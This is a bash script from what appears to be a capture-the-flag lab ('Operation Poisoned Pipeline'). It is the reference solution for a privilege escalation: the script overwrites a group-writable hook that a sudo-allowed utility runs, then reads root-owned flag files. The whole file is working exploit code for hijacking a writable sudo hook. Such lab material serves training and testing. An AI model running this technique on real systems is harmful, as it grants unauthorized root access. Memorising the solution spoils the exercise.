#!/usr/bin/env bash
# S05 - Broken Trust
# Reference exploitation script for the intended privilege escalation.
#
# Authorized use only inside the isolated Operation Poisoned Pipeline lab.
#
# This script:
#   1. Confirms pipeline-app's sudo -l output lists deploy-verify
#   2. Confirms the hook file is group-writable by pipeline-app
#   3. Overwrites the hook with a benign payload that reveals uid=0
#   4. Runs sudo deploy-verify
#   5. Restores the hook afterwards (best effort)

set -euo pipefail

HOOK="/opt/nexora/hooks/verify.sh"
UTIL="/usr/local/bin/deploy-verify"

if [[ ! -w "$HOOK" ]]; then
  echo "[!] Hook is not writable by the current account: $HOOK" >&2
  exit 1
fi

echo "[+] Current sudo policy:"
sudo -n -l

echo
echo "[+] Hook metadata:"
ls -ln "$HOOK"

echo
echo "[+] Backing up hook to /tmp/s05-poc.bak"
cp "$HOOK" /tmp/s05-poc.bak

cleanup() {
  cp /tmp/s05-poc.bak "$HOOK" 2>/dev/null || true
  rm -f /tmp/s05-poc.bak
}
trap cleanup EXIT

echo "[+] Overwriting hook with escalation probe"
cat > "$HOOK" <<'EOF'
#!/bin/bash
echo "[verify] running as uid=$(id -u) gid=$(id -g)"
echo "----- S05 -----"
cat /root/s05_flag.txt 2>/dev/null
echo
echo "----- S06 -----"
cat /root/s06_pivot.txt 2>/dev/null
EOF
chmod 0755 "$HOOK"

echo
echo "[+] Running sudo $UTIL"
sudo -n "$UTIL"
